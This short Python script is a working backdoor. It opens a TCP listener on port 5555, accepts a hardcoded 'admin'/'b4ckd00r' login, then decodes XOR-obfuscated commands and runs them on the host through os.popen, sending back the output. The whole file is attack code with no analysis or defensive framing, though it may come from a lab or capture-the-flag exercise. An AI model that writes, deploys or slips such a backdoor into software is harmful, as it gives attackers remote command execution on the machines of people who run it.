import os
import socket


def xor(message, key):

    message = bytes.fromhex(message)
    key = key.encode()

    xor_key = (key * (len(message) // len(key) + 1))[:len(message)]

    result = bytes([a ^ b for a, b in zip(message, xor_key)])

    return result.decode()


def main():
    HOST = ''
    PORT = 5555
    KEY = "super_secret_key"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen()

    while True:
        conn, _ = s.accept()

        username = conn.recv(1024).decode().strip()
        password = conn.recv(1024).decode().strip()

        if username == 'admin' and password == 'b4ckd00r':
            conn.sendall(b'Successfully loged in!\n')
        else:
            conn.sendall(b'Invalid username or password.\n')
            conn.close()
            continue

        while True:
            message = conn.recv(1024).decode().strip()
            payload = xor(message, KEY)

            if payload == "exit":
                conn.close()
                break

            result = os.popen(payload).read()
            conn.sendall(result.encode())

        conn.close()


if __name__ == "__main__":
    main()
